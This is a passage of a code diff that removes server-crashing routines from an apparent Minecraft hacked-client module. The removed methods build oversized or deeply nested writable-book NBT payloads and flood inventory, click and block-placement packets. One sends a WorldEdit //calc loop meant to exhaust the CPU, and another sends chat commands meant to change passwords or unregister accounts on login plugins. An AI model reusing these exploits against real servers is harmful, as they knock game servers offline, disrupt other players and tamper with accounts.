-                final String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-                final NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
-                list.appendTag(tString);
-            }
-            tag.setString("author", author);
-            tag.setString("title", "Play with me.");
-            tag.setTag("pages", list);
-            book.setTagInfo("pages", list);
-            book.setTagCompound(tag);
-
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, book));
-
-
-        } catch (Exception ex) {
-            PlayerUtils.sendMessage("Crash Fail...");
-        }
-    }
-
-    public void Worledit() {
-        if (TimeHelper.hasReached(1000)) {
-            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
-        }
-    }
-
-    public void Zerosmash() {
-        final ItemStack book = new ItemStack(Items.writable_book);
-        final NBTTagList list = new NBTTagList();
-        final NBTTagCompound tag = new NBTTagCompound();
-        final String author = Minecraft.getMinecraft().getSession().getUsername();
-        final String title = "PlaceBookCrasher";
-        final String size = "38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789";
-        for (int i = 0; i < 50; ++i) {
-            final NBTTagString tString = new NBTTagString(size);
-            list.appendTag(tString);
-        }
-        tag.setString("author", author);
-        tag.setString("title", title);
-        tag.setTag("pages", list);
-        book.setTagInfo("pages", list);
-        book.setTagCompound(tag);
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
-    }
-
-    public static long Random(double min, double max) {
-        return (long) ((Math.random() * (1000 / min - 1000 / max + 1)) + 1000 / max);
-    }
-
-    public void AuthmeCrash() {
-        if (TimeHelper.hasReached(500)) {
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("Team4Griefers"));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/xlogin changuepassword Hacked123 Hacked123"));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/pswadminchange"));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/cp unregister"));
-        }
-    }
-
-    public void Packetflood() {
-        try {
-            final ItemStack bookObj = new ItemStack(Items.writable_book);
-            final NBTTagList list = new NBTTagList();
-            final NBTTagCompound tag = new NBTTagCompound();
-            final String author = Minecraft.getMinecraft().getSession().getUsername();
-            final String title = "ClickCrasher";
-            final String size = "38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789";
-            for (int i = 0; i < 50; ++i) {
-                final String siteContent = "38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789";
-                final NBTTagString tString = new NBTTagString("38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745ÃƒÅ¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789");
-                list.appendTag(tString);
-            }
-            tag.setString("author", author);
-            tag.setString("title", "ClickCrasher");
-            tag.setTag("pages", list);
-            bookObj.setTagInfo("pages", list);
-            bookObj.setTagCompound(tag);
-            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 0, 0, 1, bookObj, (short) 0));
-        } catch (Exception var10) {
-            var10.printStackTrace();
-        }
-    }
- public void Custombyte() {
-     ItemStack book = new ItemStack(Items.writable_book);
-     NBTTagList l = new NBTTagList();
-
-     for (int i = 0; i < 32766; ++i) {
-         l.appendTag(new NBTTagString("38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745�36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789"));
-     }
-
-     NBTTagCompound tag = new NBTTagCompound();
-     tag.setTag("pages", l);
-     book.setTagCompound(tag);
-
-     for (int packets = 0; packets < 100; ++packets) {
-         Minecraft.getMinecraft().getNetHandler().getNetworkManager().channel.writeAndFlush(new C0EPacketClickWindow(0, 1, 0, 1, book, (short) 0));
-     }
-      toggle();
- }
- public void MinePlex() {
-     for (int c = 0; c < 30; ++c) {
-         NBTTagCompound comp = new NBTTagCompound();
-         NBTTagList list = new NBTTagList();
-
-         for (int i = 0; i < 2; ++i) {
-             list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
-         }
-
-         comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
-         comp.setString("title", "oneClickHardCrasherBookEdit");
-         comp.setByte("resolved", (byte) 1);
-         comp.setTag("pages", list);
-         ItemStack stack = new ItemStack(Items.writable_book);
-         stack.setTagCompound(comp);
-         PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
-         buffer.writeItemStackToBuffer(stack);
-         Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
-     }
-  toggle();
- }
- }
+}
 
 
 
